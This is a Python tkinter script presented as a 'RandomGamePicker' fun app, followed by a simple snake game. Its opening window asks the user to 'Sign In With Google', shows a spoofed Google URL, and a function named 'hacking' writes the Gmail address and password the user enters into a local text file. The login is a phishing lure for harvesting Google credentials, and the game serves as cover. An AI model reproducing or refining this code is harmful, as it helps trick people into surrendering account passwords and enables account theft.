from tkinter import *

root =Tk()

root.title("RandomGamePicker")

root.geometry("400x400")
def GoogleLogin ():
    _root= Tk()
    root.destroy()
    _root.geometry("350x350")

    def hacking():
        ent_1= entry_1_2.get()
        ent_2= entry_1_3.get()
        file = open("Text.txt","w")
        _root.quit()
        file.write("Gmail Or Username -")
        file.write(ent_1)   
        file.write("Password -")
        
        file.write(ent_2)
        
        



    text_1 = Text(_root, height = 1, width = 40)
    text_1.grid()

    sentense = "www.google.account.in"
    
    label_1_1 = Label(_root, text = "",font = (None, 18)) 
    label_1_1.grid()

    label_1_2 = Label(_root , text = "Gmail : ", font = (None, 10))
    label_1_2.grid()                                                    
                                                        
    entry_1_2 = Entry(_root,font = (None, 18))
    entry_1_2.grid()

    label_1_3 = Label(_root , text = "Password : ", font = (None,))
    label_1_3.grid()                                                    
                                                        
    entry_1_3 = Entry(_root,font = (None, 18))
    entry_1_3.grid()

    label_1_4 = Label(_root, text = "")
    label_1_4.grid()

    button_1_1 = Button(_root, text = "Next", width = 5, height = 2,bg = "Blue", fg = "Red", command = hacking)
    button_1_1.grid()






    text_1.insert(0.0, sentense)

    _root.mainloop()







label_1 = Label(root , text = "To Continue Sign In With Google" , font=(None, 19))
label_1.grid()

label_2 = Label(root , text= "", font = (None, 10))
label_2.grid()

label_3 = Label(root, text = "Welcome To Our App")
label_3.grid()
label_4 = Label(root, text = "This App Is For Fun")
label_4.grid()
label_5 = Label(root, text = "CopyRights Reserved")
label_5.grid()
label_6 = Label(root, text = "Owner - Garv CO-Owner Nikhil")
label_6.grid()
chk = Checkbutton(root , text = "I Accpet All Terms And Conditions And I am 15+")
chk.grid()

label_7 = Label(root, text = "")
label_7.grid()

button_1 = Button(root , text = "Sign In With Google" , font = (None,14), bg = "Blue", fg = "Red", command = GoogleLogin,)
button_1.grid()



root.mainloop()

from turtle import *
from random import randrange
from freegames import square, vector

food = vector(0, 0)
snake = [vector(10, 0)]
aim = vector(0, -10)

def change(x, y):
    "Change snake direction."
    aim.x = x
    aim.y = y

def inside(head):
    "Return True if head inside boundaries."
    return -200 < head.x < 190 and -200 < head.y < 190

def move():
    "Move snake forward one segment."
    head = snake[-1].copy()
    head.move(aim)

    if not inside(head) or head in snake:
        square(head.x, head.y, 9, 'red')
        update()
        return

    snake.append(head)

    if head == food:
        print('Snake:', len(snake))
        food.x = randrange(-15, 15) * 10
        food.y = randrange(-15, 15) * 10
    else:
        snake.pop(0)

    clear()

    for body in snake:
        square(body.x, body.y, 9, 'blue')

    square(food.x, food.y, 9, 'red')
    update()
    ontimer(move, 100)


hideturtle()
tracer(False)
listen()
onkey(lambda: change(10, 0), 'Right')
onkey(lambda: change(-10, 0), 'Left')
onkey(lambda: change(0, 10), 'Up')
onkey(lambda: change(0, -10), 'Down')
move()
done()
